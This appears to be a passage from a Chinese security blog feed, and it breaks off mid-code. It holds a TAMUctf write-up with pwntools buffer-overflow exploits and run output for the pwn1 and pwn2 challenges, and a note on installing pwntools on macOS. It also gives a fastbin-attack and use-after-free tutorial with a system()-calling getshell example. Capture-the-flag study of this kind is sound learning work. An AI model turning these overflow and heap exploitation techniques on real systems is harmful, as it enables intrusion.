<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.tamuctf.com'</span><span class="token punctuation">,</span><span class="token number">4321</span><span class="token punctuation">)</span>

log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What... is your name?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token string">'Sir Lancelot of Camelot'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What... is your quest?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'To seek the Holy Grail.'</span><span class="token punctuation">)</span>
sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'What... is my secret?'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x2b</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xDEA110C8</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>####runing</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@Sec:~$ python pwn1.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Opening connection to pwn.tamuctf.com on port 4321: Done
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x81 bytes:
    <span class="token string">'Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\n'</span>
    <span class="token string">'What... is your name?\n'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Stop<span class="token operator">!</span> Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
    What<span class="token punctuation">..</span>. is your name?
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x18 bytes:
    <span class="token string">'Sir Lancelot of Camelot\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x17 bytes:
    <span class="token string">'What... is your quest?\n'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 
    What<span class="token punctuation">..</span>. is your quest?
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x18 bytes:
    <span class="token string">'To seek the Holy Grail.\n'</span>
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x16 bytes:
    <span class="token string">'What... is my secret?\n'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 
    What<span class="token punctuation">..</span>. is my secret?
<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent 0x30 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  61 61 61 c8  10 a1 de 0a  │aaaa│aaaa│aaa·│····│
    00000030
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode

<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x31 bytes:
    <span class="token string">'Right. Off you go.\n'</span>
    <span class="token string">'gigem{34sy_CC428ECD75A0D392}\n'</span>
    <span class="token string">'\n'</span>
Right. Off you go.
gigem<span class="token punctuation">{</span>34sy_CC428ECD75A0D392<span class="token punctuation">}</span>
</code></pre>
<h3 id="PWN2"><a href="#PWN2" class="headerlink" title="PWN2"></a>PWN2</h3><p>载入ida</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1h] [ebp-27h]</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_0 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which function would you like to call?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">select_func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>ghidra</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  <span class="token keyword">char</span> local_2f <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  undefined <span class="token operator">*</span>local_10<span class="token punctuation">;</span>

  local_10 <span class="token operator">=</span> <span class="token operator">&amp;</span>stack0x00000004<span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which function would you like to call?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>local_2f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">select_func</span><span class="token punctuation">(</span>local_2f<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>gets接收大小为31</p>
<p>gets接收字符串s 然后 执行select_func 函数 跟进</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">select_func</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+Eh] [ebp-2Ah] </span>
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>v3<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>two<span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">,</span> <span class="token number">0x1Fu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> <span class="token string">"one"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">v3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里可以对照ghidra 分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">
<span class="token keyword">void</span> <span class="token function">select_func</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  <span class="token keyword">char</span> local_2e <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 定义了<span class="token keyword">char</span> dest  <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span>
  code <span class="token operator">*</span>local_10<span class="token punctuation">;</span>

  local_10 <span class="token operator">=</span> two<span class="token punctuation">;</span>
  <span class="token function">strncpy</span><span class="token punctuation">(</span>local_2e<span class="token punctuation">,</span>param_1<span class="token punctuation">,</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  iVar1 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>local_2e<span class="token punctuation">,</span><span class="token string">"one"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    local_10 <span class="token operator">=</span> one<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token punctuation">(</span><span class="token operator">*</span>local_10<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>src为gets接收过来的字符串 strncpy函数将src写入dest </p>
<p> strncpy函数只能接受dest [30]</p>
<p>查看 shell函数地址 </p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>two    .text            000006AD
print_flag    .text    000006D8    
one    .text            00000754
</code></pre><p>发现 two函数地址与print flag后两位不同 </p>
<p>再查看条件判断 只需要利用 strncpy函数1字节溢出修改two地址 即可</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn2'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Which function would you like to call?\n"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">30</span><span class="token operator">+</span><span class="token string">'\xd8'</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;pwn1&quot;&gt;&lt;a href=&quot;#pwn1&quot; class=&quot;headerlink&quot; title=&quot;pwn1&quot;&gt;&lt;/a&gt;pwn1&lt;/h3&gt;&lt;p&gt;查看ida&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;c&quot; data-li
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>macOS Mojave install pwntools Solved</title>
    <link href="http://iosmosis.github.io/2018/12/16/macOS-Mojave-install-pwntools-Solved/"/>
    <id>http://iosmosis.github.io/2018/12/16/macOS-Mojave-install-pwntools-Solved/</id>
    <published>2018-12-16T08:15:08.000Z</published>
    <updated>2018-12-16T08:19:27.529Z</updated>
    
    <content type="html"><![CDATA[<p>Mojave 直接安装pwntools会报错</p>
<p>主要报错原因是因为 capstone 和 unicorn 安装的问题</p>
<p>这里贴出解决办法</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">brew <span class="token function">install</span> capstone <span class="token operator">&amp;&amp;</span> <span class="token function">export</span> MACOS_UNIVERSAL<span class="token operator">=</span>no <span class="token operator">&amp;&amp;</span> pip <span class="token function">install</span> capstone
brew <span class="token function">install</span> unicorn <span class="token operator">&amp;&amp;</span> UNICORN_QEMU_FLAGS<span class="token operator">=</span><span class="token string">"--python=<span class="token variable"><span class="token variable">`</span><span class="token function">whereis</span> python<span class="token variable">`</span></span>"</span> pip <span class="token function">install</span> unicorn
</code></pre>
<p>之后再运行安装即可</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Mojave 直接安装pwntools会报错&lt;/p&gt;
&lt;p&gt;主要报错原因是因为 capstone 和 unicorn 安装的问题&lt;/p&gt;
&lt;p&gt;这里贴出解决办法&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Fastbin Attack 总结</title>
    <link href="http://iosmosis.github.io/2018/11/29/Fastbin%20Attack/"/>
    <id>http://iosmosis.github.io/2018/11/29/Fastbin Attack/</id>
    <published>2018-11-29T08:02:08.000Z</published>
    <updated>2019-09-13T09:11:31.721Z</updated>
    
    <content type="html"><![CDATA[<p>迷途指针、野指针、空指针</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>迷途指针：也称悬空指针，指的是不指向任何合法的对象的指针,可以指向任何地址,并且对该地址的数值进行修改或删除,可能会造成意想不到的后果
野指针：未被初始化的指针,野指针所导致的错误和迷途指针非常相似,但野指针的问题更容易被发现
空指针：就是一个被赋值为0的指针,它不指向任何的对象或者函数
</code></pre><p>理解typedef void (*funcptr)(void)</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> 只对已有的类型进行别名定义，不产生新的类型
<span class="token macro property">#<span class="token directive keyword">define</span> 只是在预处理过程对代码进行简单的替换</span>

<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span> <span class="token operator">*</span>funcptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义指针类型</span>

<span class="token keyword">void</span> <span class="token function">fun1</span><span class="token punctuation">(</span><span class="token keyword">char</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//定义函数</span>
<span class="token punctuation">{</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    funcptr p1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义了一个该类型的指针p1</span>
    p1 <span class="token operator">=</span> fun1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p1指向函数一</span>
    <span class="token function">p1</span><span class="token punctuation">(</span><span class="token string">"hey"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h5 id="malloc-hook利用"><a href="#malloc-hook利用" class="headerlink" title="__malloc_hook利用"></a>__malloc_hook利用</h5><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>__malloc_hook 附近

64位下在 __malloc_hook - 0x23 + 0x8 处 的值 为 p64(0x7f) 

然后想办法修改 位于 0x70 的 fastbin 的 chunk 的 fd 为 __malloc_hook - 0x23，然后分配几次 0x70 的 chunk 就可以修改 __malloc_hook

main_arean-&gt;fastbinY 数组

该数组用于存放 指定大小的 fastbin 的表头指针，如果为空则为 p64(0) , 而堆的地址基本 是 0x5x 开头的（其在内存就是 xx xx..... 5x)， 此时如果在 main_arean-&gt;fastbinY 的 相邻项为 0x0 (相邻大小的 fastbin), 就会出现 5x 00 00 00... , 所以就可以出现 0x000000000000005x ，可以把它作为 fastbin 的 size 进行 fastbin attack ，不过作为 fastbin attack 的 size 不能 为 0x55

于是想办法修改 位于 0x50 的 fastbin 的 chunk 的 fd 为 __malloc_hook - 0x23，然后分配几次 0x50 的 chunk 就可以分配到 main_arean, 然后就可以修改 main_arean-&gt;top 

std* 结构体

在 std* 类结构体中有很多字段都会被设置为 0x0 , 同时其中的某些字段会有 libc 的地址大多数情况下 libc 是加载在 0x7f.... ， 配合着 std* 中的 其他 0x0 的字段，我们就可以有 p64(0x7f) ， 然后修改 位于 0x70 的 fastbin 的 chunk 的 fd 为该位置即可
pwndbg&gt; x/20gx stdin
</code></pre><p>uaf漏洞成因</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>在free了堆块没有进行指针置null 导致产生迷途指针，由于申请大小小于256kb就先将内存卡标记为空闲状态，如果malloc相同大小的堆块，将可以再次使用该内存地址
</code></pre><p>简单例子</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
    p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hey"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%x,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
    p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hahah"</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%x,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gcc -g uaf.c -o uaf
</code></pre>
<p>运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ./uaf
p1 addr:1b51010,hey
p2 addr:1b51440,hahah
</code></pre>
<p>虽然此处存在uaf ，free p1后没有置指针为null ，但是没有申请相同大小还是无法申请使用的同一内存地址</p>
<p>接下来malloc 相同大小 </p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">;</span>
    p1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hey"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%x,%s\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
    p2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">"hahah"</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2 addr:%x,%s\n"</span><span class="token punctuation">,</span>p2<span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>编译</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gcc -g uaf.c -o uaf
</code></pre>
<p>运行</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ios:~$ ./uaf
p1 addr:1353010,hey
p2 addr:1353010,hahah
</code></pre>
<p>发现成功申请到相同内存地址</p>
<p>简单getshell 利用</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;string.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">typedef</span> <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>f_ptr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">char</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">char</span> comm<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
<span class="token function">system</span><span class="token punctuation">(</span>comm<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>

    f_ptr <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token punctuation">(</span>f_ptr<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//申请堆块大小</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p1 addr:%p\n"</span><span class="token punctuation">,</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    p1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>print<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用p1数组指针指向print函数</span>
